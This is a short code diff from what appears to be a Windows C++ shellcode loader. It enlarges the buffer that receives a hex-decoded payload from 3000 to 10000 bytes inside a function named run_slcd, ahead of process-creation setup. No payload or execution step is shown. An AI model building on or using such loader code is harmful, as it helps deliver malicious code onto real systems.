@@ -158,7 +158,7 @@ DWORD WINAPI run_slcd(LPVOID lpParameter)
 {
     string _code_str = str_to_hex(hexcode);
     int _len = hexcode.length();
-    unsigned char _code[3000] = { 0 };
+    unsigned char _code[10000] = { 0 };
     memcpy(_code, _code_str.c_str(), _len / 2 + 1);
     UINT _codeSize = sizeof(_code);
     STARTUPINFOA si = { 0 };
